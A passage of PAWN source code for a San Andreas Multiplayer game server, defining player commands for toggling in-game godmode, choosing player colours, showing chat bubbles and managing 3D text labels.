	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	SpamProtection(playerid, "/god cmd");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][godmode] == 0)
	{
		player[playerid][godmode] = 1;
    	format(strings, sizeof(strings), "%s has "EMBED_GREEN"ENABLED"EMBED_WHITE" godmode.", playername);
	} else {
		player[playerid][godmode] = 0;
		SetPlayerHealth(playerid, 100.0);
    	format(strings, sizeof(strings), "%s has "EMBED_RED"DISABLED"EMBED_WHITE" godmode.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);

	if (IsPlayerRegistered(playerid))
	{
		new mysqlStr[100];
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_god` = %d WHERE account_id = %d LIMIT 1", player[playerid][godmode], GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

dcmd_vgod(playerid,params[])
{
	#pragma unused params

	if (!servergodmode && !IsPlayerAdminLevel(playerid, 5))
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled server godmode.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	SpamProtection(playerid, "/vgod cmd");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][vgodmode] == 0)
	{
		player[playerid][vgodmode] = 1;
    	format(strings, sizeof(strings), "%s has "EMBED_GREEN"ENABLED"EMBED_WHITE" visual vehicle godmode.", playername);
	} else {
		player[playerid][vgodmode] = 0;
		
		new vID = GetPlayerVehicleID(playerid);
		if (vID) SetVehicleHealth(vID, 1000.0);
    	format(strings, sizeof(strings), "%s has "EMBED_RED"DISABLED"EMBED_WHITE" visual vehicle godmode.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);

	if (IsPlayerRegistered(playerid))
	{
		new mysqlStr[101];
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_vgod` = %d WHERE account_id = %d LIMIT 1", player[playerid][vgodmode], GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

dcmd_g(playerid,params[])
{
	#pragma unused params

	if (!servergodmode && !IsPlayerAdminLevel(playerid, 6))
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has currently disabled server godmode.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	SpamProtection(playerid, "/g cmd");

	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][godmode] == 0)
	{
		player[playerid][godmode] = 1;
		player[playerid][vgodmode] = 1;
    	format(strings, sizeof(strings), "%s has "EMBED_GREEN"ENABLED"EMBED_WHITE" godmode & visual vehicle godmode.", playername);
	} else {
		player[playerid][godmode] = 0;
		player[playerid][vgodmode] = 0;
		SetPlayerHealth(playerid, 100.0);
    	format(strings, sizeof(strings), "%s has "EMBED_RED"DISABLED"EMBED_WHITE" godmode & visual vehicle godmode.", playername);
	}
	SendServerMessageToAll(EMBED_WHITE, strings);

	if (IsPlayerRegistered(playerid))
	{
		new mysqlStr[125];
		format(mysqlStr, sizeof(mysqlStr), "UPDATE "MYSQL_TABLE_PREFERENCES" SET `preference_god` = %d, `preference_vgod` = %d WHERE account_id = %d LIMIT 1", player[playerid][godmode], player[playerid][vgodmode], GetPlayerAccountID(playerid));
		mysql_run_query(mysqlConnection, mysqlStr, false, "", "");
	}
	return 1;
}

dcmd_vlights(playerid,params[])
{
	#pragma unused params

	if (player[playerid][vlights] == 0)
	{
		player[playerid][vlights] = 1;
	} else {
		player[playerid][vlights] = 0;
		
		new vID = GetPlayerVehicleID(playerid);
		if (vID)
		{
			new panels, doors, lights, tires;

			GetVehicleDamageStatus(vID, panels, doors, lights, tires);
		    UpdateVehicleDamageStatus(vID, panels, doors, 0, tires);
	    }
	}
	return 1;
}

dcmd_pcolour(playerid,params[])
return dcmd_pcolor(playerid,params);

dcmd_pcolor(playerid,params[])
{
	new color[15];

	if (sscanf(params, "s[15] ", color))
	{
		new colorStr[1046];

		colorStr =			""EMBED_WHITE"Disable\n\
		                    Automatic\n\
							"EMBED_GREEN"GREEN\n\
							"EMBED_RED"RED\n\
							"EMBED_BLUE"BLUE\n\
							"EMBED_PINK"PINK\n\
							"EMBED_PURPLE"PURPLE\n\
							"EMBED_YELLOW"YELLOW\n\
							"EMBED_BROWN"BROWN\n\
							"EMBED_GREY"GREY\n\
							"EMBED_GREY"BLACK\n\
							"EMBED_LPINK"LPINK\n\
							"EMBED_ORANGE"ORANGE\n\
							"EMBED_PINKRED"PINKRED\n\
							"EMBED_DARKRED"DARKRED\n\
							"EMBED_DARKERRED"DARKERRED\n\
							"EMBED_ORANGERED"ORANGERED\n\
							"EMBED_TOMATO"TOMATO\n\
							"EMBED_LIGHTBLUE"LIGHTBLUE\n\
							"EMBED_LIGHTNAVY"LIGHTNAVY\n\
							"EMBED_NAVYBLUE"NAVYBLUE\n";

		strcat(colorStr, 	""EMBED_LBLUE"LBLUE\n\
							"EMBED_LLBLUE"LLBLUE\n\
							"EMBED_FLBLUE"FLBLUE\n\
							"EMBED_BLUEVIOLET"BLUEVIOLET\n\
							"EMBED_BISQUE"BISQUE\n\
							"EMBED_LIME"LIME\n\
							"EMBED_LAWNGREEN"LAWNGREEN\n\
							"EMBED_SEAGREEN"SEAGREEN\n\
							"EMBED_LIMEGREEN"LIMEGREEN\n\
							"EMBED_SPRINGGREEN"SPRINGGREEN\n\
							"EMBED_YELLOWGREEN"YELLOWGREEN\n\
							"EMBED_GREENYELLOW"GREENYELLOW\n\
							"EMBED_OLIVE"OLIVE\n\
							"EMBED_AQUA"AQUA\n\
							"EMBED_MEDIUMAQUA"MEDIUMAQUA\n\
							"EMBED_MAGENTA"MAGENTA\n\
							"EMBED_MEDIUMMAGENTA"MEDIUMMAGENTA\n");

		strcat(colorStr, 	""EMBED_CHARTREUSE"CHARTREUSE\n\
							"EMBED_CORAL"CORAL\n\
							"EMBED_GOLD"GOLD\n\
							"EMBED_INDIGO"INDIGO\n\
							"EMBED_IVORY"IVORY");

		ShowPlayerDialog(playerid, DIALOGID_PCOLOUR, DIALOG_STYLE_LIST, "Available colours", colorStr, "Set", "Cancel");
	} else {
		if (!strcmp(color, "off",true))					player[playerid][pcolour] = 0;
		else if (!strcmp(color, "random",true))			player[playerid][pcolour] = 1;
		else if (!strcmp(color, "green",true))			player[playerid][pcolour] = 2;
		else if (!strcmp(color, "red",true))			player[playerid][pcolour] = 3;
		else if (!strcmp(color, "blue",true))			player[playerid][pcolour] = 4;
		else if (!strcmp(color, "pink",true))			player[playerid][pcolour] = 5;
		else if (!strcmp(color, "purple",true))			player[playerid][pcolour] = 6;
		else if (!strcmp(color, "yellow",true))			player[playerid][pcolour] = 7;
		else if (!strcmp(color, "brown",true))			player[playerid][pcolour] = 8;
		else if (!strcmp(color, "grey",true))			player[playerid][pcolour] = 9;
		else if (!strcmp(color, "black",true))			player[playerid][pcolour] = 10;
		else if (!strcmp(color, "lpink",true))			player[playerid][pcolour] = 11;
		else if (!strcmp(color, "orange",true))			player[playerid][pcolour] = 12;
		else if (!strcmp(color, "pinkred",true))		player[playerid][pcolour] = 13;
		else if (!strcmp(color, "darkred",true))		player[playerid][pcolour] = 14;
		else if (!strcmp(color, "darkerred",true))		player[playerid][pcolour] = 15;
		else if (!strcmp(color, "orangered",true))		player[playerid][pcolour] = 16;
		else if (!strcmp(color, "tomato",true))			player[playerid][pcolour] = 17;
		else if (!strcmp(color, "lightblue",true))		player[playerid][pcolour] = 18;
		else if (!strcmp(color, "lightnavy",true))		player[playerid][pcolour] = 19;
		else if (!strcmp(color, "navyblue",true))		player[playerid][pcolour] = 20;
		else if (!strcmp(color, "lblue",true))			player[playerid][pcolour] = 21;
		else if (!strcmp(color, "llblue",true))			player[playerid][pcolour] = 22;
		else if (!strcmp(color, "flblue",true))			player[playerid][pcolour] = 23;
		else if (!strcmp(color, "blueviolet",true))		player[playerid][pcolour] = 24;
		else if (!strcmp(color, "bisque",true))			player[playerid][pcolour] = 25;
		else if (!strcmp(color, "lime",true))			player[playerid][pcolour] = 26;
		else if (!strcmp(color, "lawngreen",true))		player[playerid][pcolour] = 27;
		else if (!strcmp(color, "seagreen",true))		player[playerid][pcolour] = 28;
		else if (!strcmp(color, "limegreen",true))		player[playerid][pcolour] = 29;
		else if (!strcmp(color, "springgreen",true))	player[playerid][pcolour] = 30;
		else if (!strcmp(color, "yellowgreen",true))	player[playerid][pcolour] = 31;
		else if (!strcmp(color, "greenyellow",true))	player[playerid][pcolour] = 32;
		else if (!strcmp(color, "olive",true))          player[playerid][pcolour] = 33;
		else if (!strcmp(color, "aqua",true))			player[playerid][pcolour] = 34;
		else if (!strcmp(color, "mediumaque",true))		player[playerid][pcolour] = 35;
		else if (!strcmp(color, "magenta",true))		player[playerid][pcolour] = 36;
		else if (!strcmp(color, "mediummagenta",true))	player[playerid][pcolour] = 37;
		else if (!strcmp(color, "coral",true))			player[playerid][pcolour] = 38;
		else if (!strcmp(color, "gold",true))			player[playerid][pcolour] = 39;
		else if (!strcmp(color, "gold",true))			player[playerid][pcolour] = 40;
		else if (!strcmp(color, "indigo",true))			player[playerid][pcolour] = 41;
		else if (!strcmp(color, "ivory",true))			player[playerid][pcolour] = 42;
		else SendErrorMessage(playerid, EMBED_WHITE, "Type /pcolour to open a list of predefined colours OR type /pcolour <colour|off> for instant effect (see list).");
	}
	return 1;
}

dcmd_bubble2(playerid,params[])
return dcmd_bu2(playerid,params);

dcmd_bu2(playerid,params[])
{
	if (mutedchat == true && !IsAdmin(playerid))
	return SendClientMessage(playerid, COLOR_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");
	
	new expire_time,
	    color[6],
	    message[122],
		customcolor;

	if (!sscanf(params, "ds[128]", expire_time, tmps2))
	{
	    if (expire_time < 0 || expire_time > 180)
	    {
	    	SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bu(bble)2 <expire_time_in_minutes[0-180]> (<colour>) <message>");
			SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
			return 1;
		} else expire_time = expire_time*60000;
	    
		if (!sscanf(tmps2, "s[6] s[122]", color, message))
		{
			if (!strcmp(color, "grey",true))		customcolor = 0xAFAFAFAA;
			else if (!strcmp(color, "green",true))	customcolor = COLOR_GREEN;
			else if (!strcmp(color, "red",true))	customcolor = 0xFF0000AA;
			else if (!strcmp(color, "yellow",true))	customcolor = 0xFFFF00AA;
			else if (!strcmp(color, "white",true)) 	customcolor = 0xFFFFFFAA;
			else if (!strcmp(color, "blue",true))  	customcolor = 0x0000BBAA;
			else if (!strcmp(color, "lblue",true)) 	customcolor = 0x00FFFFAA;
			else if (!strcmp(color, "orange",true))	customcolor = 0xFF9900AA;
			else if (!strcmp(color, "black",true)) 	customcolor = 0x000000AA;
			else if (!strcmp(color, "pink",true))  	customcolor = COLOR_PINK;
			else if (!strcmp(color, "lime",true))  	customcolor = COLOR_LIME;
			else if (!strcmp(color, "gold",true))  	customcolor = COLOR_GOLD;
			else if (!strcmp(color, "brown",true)) 	customcolor = COLOR_BROWN;
			else if (!strcmp(color, "random",true))	customcolor = PlayerColors[random(sizeof(PlayerColors))];
			else {
				SetPlayerChatBubble(playerid, tmps2, COLOR_PINK, 100.0, expire_time);
				GetPlayerName(playerid, playername, sizeof(playername));
				format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, tmps2);
				IRC_GroupSay(1, IRC_CHANNEL, tmps2);
				return 1;
			}
			
			SetPlayerChatBubble(playerid, message, customcolor, 100.0, expire_time);
			GetPlayerName(playerid, playername, sizeof(playername));
			format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, message);
			IRC_GroupSay(1, IRC_CHANNEL, tmps2);
		} else {
			SetPlayerChatBubble(playerid, tmps2, COLOR_PINK, 100.0, expire_time);
			GetPlayerName(playerid, playername, sizeof(playername));
			format(tmps2, sizeof(tmps2), "13*bubble* %s: %s", playername, tmps2);
			IRC_GroupSay(1, IRC_CHANNEL, tmps2);
		}
	} else {
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /bu(bble)2 <expire_time_in_minutes[0-180]> (<colour>) <message>");
		SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
	}
	return 1;
}

dcmd_label(playerid,params[])
return dcmd_la(playerid,params);

dcmd_la(playerid,params[])
{
	if (mutedchat == true && !IsAdmin(playerid))
	return SendClientMessage(playerid, COLOR_RED, "The global chat has been muted.");

	if (IsPlayerMuted(playerid))
	return SendErrorMessage(playerid, EMBED_RED, "* You are muted *");

	/*new lcommand[14],
		color[7],
	    message[122],
		customcolor;

	if (sscanf(params, "s[14] ", lcommand))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /la(bel) ADD (colour) <message> | ATTACH(vehicle) (colour) | DEL");
		SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
		return 1;
	}
	
    if (!strcmp(lcommand, "add", true))
    {
		if (!sscanf(params, "{s[14] }s[7] s[122]", color, message))
		{
			if (!strcmp(color, "grey",true))			customcolor = 0xAFAFAFAA;
			else if (!strcmp(color, "green",true))	customcolor = COLOR_GREEN;
			else if (!strcmp(color, "red",true))		customcolor = 0xFF0000AA;
			else if (!strcmp(color, "yellow",true))	customcolor = 0xFFFF00AA;
			else if (!strcmp(color, "white",true)) 	customcolor = 0xFFFFFFAA;
			else if (!strcmp(color, "blue",true))  	customcolor = 0x0000BBAA;
			else if (!strcmp(color, "lblue",true)) 	customcolor = 0x00FFFFAA;
			else if (!strcmp(color, "orange",true))	customcolor = 0xFF9900AA;
			else if (!strcmp(color, "black",true)) 	customcolor = 0x000000AA;
			else if (!strcmp(color, "pink",true))  	customcolor = COLOR_PINK;
			else if (!strcmp(color, "lime",true))  	customcolor = COLOR_LIME;
			else if (!strcmp(color, "gold",true))  	customcolor = COLOR_GOLD;
			else if (!strcmp(color, "brown",true)) 	customcolor = COLOR_BROWN;
			else if (!strcmp(color, "random",true))	customcolor = PlayerColors[random(sizeof(PlayerColors))];
			else {
				if (!IsValidDynamic3DTextLabel(player[playerid][personaltext]))
			    {
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(params[strlen(lcommand)+1], COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, _, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label created.");
				} else {
					UpdateDynamic3DTextLabelText(player[playerid][personaltext], COLOR_PINK, params[strlen(lcommand)+1]);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label updated.");
				}
				GetPlayerName(playerid, playername, sizeof(playername));
				format(ircstring, sizeof(ircstring), "13*label* %s: %s", playername, params[strlen(lcommand)+1]);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
				return 1;
			}

			if (!IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
			    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				player[playerid][personaltext] = CreateDynamic3DTextLabel(message, customcolor, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, _, 0, GetPlayerVirtualWorld(playerid), 0);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label created with custom colour.");
			} else {
				UpdateDynamic3DTextLabelText(player[playerid][personaltext], customcolor, message);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label updated with custom colour.");
			}
			GetPlayerName(playerid, playername, sizeof(playername));
			format(ircstring, sizeof(ircstring), "13*label* %s: %s", playername, message);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
		} else {
			if (!sscanf(params, "{s[14] }s[122]", message))
			{
				if (!IsValidDynamic3DTextLabel(player[playerid][personaltext]))
			    {
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(params[strlen(lcommand)+1], COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, _, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label created.");
				} else {
					UpdateDynamic3DTextLabelText(player[playerid][personaltext], COLOR_PINK, params[strlen(lcommand)+1]);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label updated.");
				}
				GetPlayerName(playerid, playername, sizeof(playername));
				format(ircstring, sizeof(ircstring), "13*label* %s: %s", playername, params[strlen(lcommand)+1]);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
			} else {
				SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /la(bel) ADD (colour) <message> | ATTACH(vehicle) (colour) | DEL");
				SendClientMessage(playerid, COLOR_YELLOW, "Colours: grey green red yellow white blue lblue black orange pink lime gold brown");
			}
		}
    } else if (!strcmp(lcommand, "attach", true))
    {
		if (!sscanf(params, "{s[14] }s[7] ", color))
		{
			if (!strcmp(color, "grey",true))			customcolor = 0xAFAFAFAA;
			else if (!strcmp(color, "green",true))	customcolor = COLOR_GREEN;
			else if (!strcmp(color, "red",true))		customcolor = 0xFF0000AA;
			else if (!strcmp(color, "yellow",true))	customcolor = 0xFFFF00AA;
			else if (!strcmp(color, "white",true)) 	customcolor = 0xFFFFFFAA;
			else if (!strcmp(color, "blue",true))  	customcolor = 0x0000BBAA;
			else if (!strcmp(color, "lblue",true)) 	customcolor = 0x00FFFFAA;
			else if (!strcmp(color, "orange",true))	customcolor = 0xFF9900AA;
			else if (!strcmp(color, "black",true)) 	customcolor = 0x000000AA;
			else if (!strcmp(color, "pink",true))  	customcolor = COLOR_PINK;
			else if (!strcmp(color, "lime",true))  	customcolor = COLOR_LIME;
			else if (!strcmp(color, "gold",true))  	customcolor = COLOR_GOLD;
			else if (!strcmp(color, "brown",true)) 	customcolor = COLOR_BROWN;
			else if (!strcmp(color, "random",true))	customcolor = PlayerColors[random(sizeof(PlayerColors))];
			else {
				if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
			    {
				    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
					DestroyDynamic3DTextLabel(player[playerid][personaltext]);
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					SendClientMessageToAll(COLOR_RED, message);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, 0.0, 0.0, playerxyza[2]+1, 100.0, playerid, _, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached.");
				} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attach>.");
				return 1;
			}

			if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
			    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
				DestroyDynamic3DTextLabel(player[playerid][personaltext]);
			    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				player[playerid][personaltext] = CreateDynamic3DTextLabel(message, customcolor, 0.0, 0.0, playerxyza[2]+1, 100.0, playerid, _, 0, GetPlayerVirtualWorld(playerid), 0);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached.");
			} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attach>.");
		} else {
			if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
			    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
				DestroyDynamic3DTextLabel(player[playerid][personaltext]);
			    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, 0.0, 0.0, playerxyza[2]+0.5, 100.0, playerid, _, 0, GetPlayerVirtualWorld(playerid), 0);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached.");
			} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attach>.");
		}
    } else if (!strcmp(lcommand, "attachvehicle", true))
    {
		if (!sscanf(params, "{s[14] }s[7] ", color))
		{
			if (!strcmp(color, "grey",true))			customcolor = 0xAFAFAFAA;
			else if (!strcmp(color, "green",true))	customcolor = COLOR_GREEN;
			else if (!strcmp(color, "red",true))		customcolor = 0xFF0000AA;
			else if (!strcmp(color, "yellow",true))	customcolor = 0xFFFF00AA;
			else if (!strcmp(color, "white",true)) 	customcolor = 0xFFFFFFAA;
			else if (!strcmp(color, "blue",true))  	customcolor = 0x0000BBAA;
			else if (!strcmp(color, "lblue",true)) 	customcolor = 0x00FFFFAA;
			else if (!strcmp(color, "orange",true))	customcolor = 0xFF9900AA;
			else if (!strcmp(color, "black",true)) 	customcolor = 0x000000AA;
			else if (!strcmp(color, "pink",true))  	customcolor = COLOR_PINK;
			else if (!strcmp(color, "lime",true))  	customcolor = COLOR_LIME;
			else if (!strcmp(color, "gold",true))  	customcolor = COLOR_GOLD;
			else if (!strcmp(color, "brown",true)) 	customcolor = COLOR_BROWN;
			else if (!strcmp(color, "random",true))	customcolor = PlayerColors[random(sizeof(PlayerColors))];
			else {
				if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
			    {
					new vID = GetPlayerVehicleID(playerid);
					if (vID)
					{
					    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
						DestroyDynamic3DTextLabel(player[playerid][personaltext]);
					    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
						player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, vID, 0, GetPlayerVirtualWorld(playerid), 0);
						SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached to vehicle.");
					} else SendErrorMessage(playerid, EMBED_WHITE, "You must be in a vehicle to attach a label to it.");
				} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attachvehicle>.");
				return 1;
			}

			if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
				new vID = GetPlayerVehicleID(playerid);
				if (vID)
				{
				    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
					DestroyDynamic3DTextLabel(player[playerid][personaltext]);
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(message, customcolor, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, vID, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached to vehicle.");
				} else SendErrorMessage(playerid, EMBED_WHITE, "You must be in a vehicle to attach a label to it.");
			} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attachvehicle>.");
		} else {
			if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
				new vID = GetPlayerVehicleID(playerid);
				if (vID)
				{
				    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
					DestroyDynamic3DTextLabel(player[playerid][personaltext]);
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, vID, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached to vehicle.");
				} else SendErrorMessage(playerid, EMBED_WHITE, "You must be in a vehicle to attach a label to it.");
			} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attachvehicle>.");
		}
    } else if (!strcmp(lcommand, "del", true))
    {
		if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
	    {
			DestroyDynamic3DTextLabel(player[playerid][personaltext]);
			SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label removed.");
		} else SendErrorMessage(playerid, EMBED_WHITE, "You don't have any label created.");
    }*/

	new lcommand[14],
	    message[122];

	if (sscanf(params, "s[14] ", lcommand))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /la(bel) ADD <message> | ATTACH(vehicle) | DEL [Colour tags allowed, for example: -RED]");
    
	if (!strcmp(lcommand, "add", true))
    {
		if (!sscanf(params, "{s[14] }s[122]", message))
		{
			if (!IsValidDynamic3DTextLabel(player[playerid][personaltext]))
		    {
			    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				player[playerid][personaltext] = CreateDynamic3DTextLabel(ColouredText(params[strlen(lcommand)+1]), COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, _, 0, GetPlayerVirtualWorld(playerid), 0);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label created.");
			} else {
				UpdateDynamic3DTextLabelText(player[playerid][personaltext], COLOR_PINK, ColouredText(params[strlen(lcommand)+1]));
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label updated.");
			}
			GetPlayerName(playerid, playername, sizeof(playername));
			format(ircstring, sizeof(ircstring), "13*label* %s: %s", playername, params[strlen(lcommand)+1]);
			IRC_GroupSay(1, IRC_CHANNEL, ircstring);
			return 1;
		} else {
			if (!sscanf(params, "{s[14] }s[122]", message))
			{
				if (!IsValidDynamic3DTextLabel(player[playerid][personaltext]))
			    {
				    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
					player[playerid][personaltext] = CreateDynamic3DTextLabel(ColouredText(params[strlen(lcommand)+1]), COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, _, 0, GetPlayerVirtualWorld(playerid), 0);
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label created.");
				} else {
					UpdateDynamic3DTextLabelText(player[playerid][personaltext], COLOR_PINK, ColouredText(params[strlen(lcommand)+1]));
					SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label updated.");
				}
				GetPlayerName(playerid, playername, sizeof(playername));
				format(ircstring, sizeof(ircstring), "13*label* %s: %s", playername, params[strlen(lcommand)+1]);
				IRC_GroupSay(1, IRC_CHANNEL, ircstring);
			} else SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /la(bel) ADD <message> | ATTACH(vehicle) | DEL [Colour tags allowed, for example: -RED]");
			return 1;
		}
    } else if (!strcmp(lcommand, "attach", true))
    {
		if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
	    {
		    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
			DestroyDynamic3DTextLabel(player[playerid][personaltext]);
		    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
			SendClientMessageToAll(COLOR_RED, message);
			player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, 0.0, 0.0, playerxyza[2]+1, 100.0, playerid, _, 0, GetPlayerVirtualWorld(playerid), 0);
			SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached.");
		} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attach>.");
		return 1;
    } else if (!strcmp(lcommand, "attachvehicle", true))
    {
		if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
	    {
			new vID = GetPlayerVehicleID(playerid);
			if (vID)
			{
			    GetDynamic3DTextLabelText(player[playerid][personaltext], message);
				DestroyDynamic3DTextLabel(player[playerid][personaltext]);
			    GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
				player[playerid][personaltext] = CreateDynamic3DTextLabel(message, COLOR_PINK, playerxyza[0], playerxyza[1], playerxyza[2], 100.0, _, vID, 0, GetPlayerVirtualWorld(playerid), 0);
				SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label attached to vehicle.");
			} else SendErrorMessage(playerid, EMBED_WHITE, "You must be in a vehicle to attach a label to it.");
		} else SendErrorMessage(playerid, EMBED_WHITE, "You must create a label first before attaching by using /la(bel) <attachvehicle>.");
		return 1;
    } else if (!strcmp(lcommand, "del", true))
    {
		if (IsValidDynamic3DTextLabel(player[playerid][personaltext]))
	    {
			DestroyDynamic3DTextLabel(player[playerid][personaltext]);
			SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Label removed.");
		} else SendErrorMessage(playerid, EMBED_WHITE, "You don't have any label created.");
    } else SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /la(bel) ADD <message> | ATTACH(vehicle) | DEL [Colour tags allowed, for example: -RED]");
	return 1;
}

dcmd_copystick(playerid,params[])
{
	new idx,
		copymode;

	tmps2 = strtok(params, idx);
	copymode = strval(tmps2);
	if (!strlen(tmps2) || copymode != 1 && copymode != 2)
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /copystick <1 (osticks) / 2 (posticks)> <playerid>");

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /copystick <1 (osticks) / 2 (posticks)> <playerid>");
	
	if (!IsNumeric(tmps2)) giveplayerid = ReturnPlayerID(tmps2);
	else giveplayerid = strval(tmps2);

	if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	{
		if (giveplayerid == playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can't copy yourself!");
	
	   	new vID = GetPlayerVehicleID(playerid);
	
